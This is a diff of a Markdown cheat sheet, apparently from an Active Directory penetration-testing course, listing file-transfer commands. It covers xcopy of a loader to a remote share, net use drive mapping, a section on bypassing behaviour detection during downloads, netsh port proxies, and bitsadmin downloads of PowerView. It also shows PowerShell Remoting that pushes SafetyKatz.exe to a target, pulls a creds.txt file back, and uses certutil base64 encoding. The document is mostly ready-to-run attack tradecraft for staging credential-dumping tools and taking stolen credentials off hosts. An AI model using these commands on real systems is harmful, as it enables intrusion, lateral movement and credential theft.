@@ -3,6 +3,8 @@
 ```cmd
 echo F | xcopy C:\AD\Tools\Loader.exe \\usweb\C$\Users\Public\Loader.exe /Y
 ```
+---
+
 ## Net use
 
 **Upload files to remote computer by mapping remote folder to our drive X on our machine:**
@@ -23,6 +25,7 @@ net use x: /d
 > ⚠️ **PAY ATTENTION:**
 > Check if non-admin can mount it.
 ---
+
 ## Bypass behaviour detection when downloading a file
 
 > ⚠️ **PAY ATTENTION:**
@@ -42,6 +45,7 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
 ```
 ---
+
 ## Rejetto HFS
 https://github.com/rejetto/hfs/releases/download/v0.56.0/hfs-windows-x64-0.56.0.zip
 
@@ -67,6 +71,7 @@ bitsadmin /transfer myjob /download /priority high http://192.168.1.131/PowerVie
 ```powershell
 bitsadmin /transfer myjob /download /priority high http://127.0.0.1:8080/PowerView.ps1 c:\temp\PowerView.ps1
 ```
+---
 
 ## PowerShell Remoting
 
@@ -79,4 +84,17 @@ Copy-Item -ToSession $sess -Path "C:\Tools\SafetyKatz.exe" -Destination "C:\User
 
 ```powershell
 Copy-Item -FromSession $sess -Path "C:\Logs\creds.txt" -Destination "C:\AD\" -verbose
+```
+---
+
+## Base64
+
+**Base64 encode:**
+```powershell
+certutil -encode foo.exe foo.b64
+```
+
+**Base64 decode:**
+```powershell
+certutil -decode foo.b64 foo.exe
 ```
